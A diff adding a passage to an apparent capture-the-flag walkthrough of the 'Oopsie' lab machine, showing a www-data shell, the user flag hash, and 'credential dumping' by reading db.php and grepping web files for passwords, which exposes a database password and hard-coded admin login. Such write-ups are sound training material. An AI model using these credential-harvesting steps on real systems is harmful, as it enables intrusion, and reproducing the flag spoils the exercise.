@@ -359,11 +359,50 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 $
 ```
 
+We can make this shell interactive by using the instructions [here](../make-your-dumb-netcat-shell-interactive-and-awesome.md).&#x20;
 
+We are currently as user `www-data`
 
+```
+www-data@oopsie$ whoami
+whoami
+www-data
+```
 
+Viewing the contents of the home directory we find `robert` directory within it. So robert has to be one of the users.
 
+### Robert's FLAG (User FLAG)
 
+```
+www-data@oopsie:/home/robert$ cat user.txt
+cat user.txt
+f2c74ee8db7983851ab2a96a44eb7981
+```
+
+### Credential dumping
+
+Since we are as user `www-data`, we cannot do much being this user. So we need to be user `robert` or the `root` user.
+
+Within the `/var/www/html/cdn-cgi/login` directory we find two interesting files `db.php` and `admin.php.`&#x20;
+
+```bash
+www-data@oopsie:/var/www/html/cdn-cgi/login$ cat db.php
+```
+
+```
+<?php
+$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
+?>
+```
+
+```bash
+www-data@oopsie:/var/www/html/cdn-cgi/login$ cat * | grep -i passw*
+```
+
+```
+if($_POST["username"]==="admin" && $_POST["password"]==="MEGACORP_4dm1n!!")
+<input type="password" name="password" placeholder="Password" />
+```
 
 
 
